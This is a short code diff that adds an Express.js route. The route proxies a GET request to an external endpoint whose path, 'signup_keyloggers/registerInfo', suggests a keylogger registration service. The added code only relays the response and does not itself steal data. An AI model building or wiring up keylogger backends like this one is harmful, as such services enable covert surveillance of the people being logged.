@@ -71,4 +71,18 @@ router.get('/n95WebUI', async (req, res) => {
     }
 });
 
+router.get('/n95Myid', async (req, res) => {
+    try {
+        const apiRes = await needle(
+            'get',
+            `https://myid.heinto55.com:4100/signup_keyloggers/registerInfo`
+        );
+        console.log(apiRes.body);
+        res.status(200).json(apiRes.body);
+    } catch (error) {
+        console.log(error);
+        res.status(500).json({ error });
+    }
+});
+
 module.exports = router;
